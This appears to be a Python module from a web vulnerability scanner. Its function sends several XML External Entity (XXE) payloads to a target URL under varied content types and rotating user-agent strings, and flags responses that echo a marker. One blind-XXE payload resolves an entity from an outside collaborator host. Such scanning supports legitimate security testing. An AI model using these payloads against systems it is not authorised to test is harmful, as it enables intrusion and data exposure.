import requests
import eventlet
from typing import List


def test_xxe(url: str) -> List:

    user_agents = [
        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1",
        "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
        "Mozilla/5.0 (Linux; Android 13; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
    ]

    content_types = ['applcation/xml', 'application/x-www-form-urlencoded', 'text/xml', 'application/xhtml+xml',
                     'application/rss+xml', 'application/atom+xml', 'application/json', 'application/svg+xml']

    # Basic Attack
    # Error Based - Using Remote DTD
    # XXE via XML parameter entities
    # Blind XXE

    payloads = [
        (
            """
                            <?xml version='1.0' encoding='UTF-8'?>
                            <!DOCTYPE test [ <!ENTITY xxe 'xxeinjection'> ]>
                            <foo>&xxe;</foo>
                        """
        ),
        (
            r"""
                            <?xml version="1.0" ?>
                            <!DOCTYPE scan [
                                <!ENTITY % xxe "xxeinjection">
                                %xxe;
                            ]>
                            <scan></scan>
                        """
        ),
        (
            r"""
                            <?xml version="1.0" encoding="ISO-8859-1"?>
                            <!DOCTYPE foo [
                            <!ELEMENT foo ANY >
                            <!ENTITY % xxe "xxeinjection" >
                            ]>
                            <foo>&xxe;</foo>
                        """
        ),
        (
            r"""
                            <?xml version="1.0" ?>
                            <!DOCTYPE root [
                            <!ENTITY % xxe SYSTEM "http://xyz.SFEDumpcollaborator.net/x"> %xxe;
                            ]>
                            <r></r>
                        """
        )
    ]

    ret = []
    i = 0
    for payload in payloads:
        for content_type in content_types:
            try:
                with eventlet.Timeout(0.5):
                    response = requests.get(url, data=payload, headers={
                                            "Content-Type": content_type, "User-Agent": user_agents[i]})
                    i += 1
                    i %= len(user_agents)
                    if "xxeinjection" in response.text:
                        ret.append(
                            f"XXE injection is detected at: {url} with payload: {payload}")
            except:
                pass
    return ret
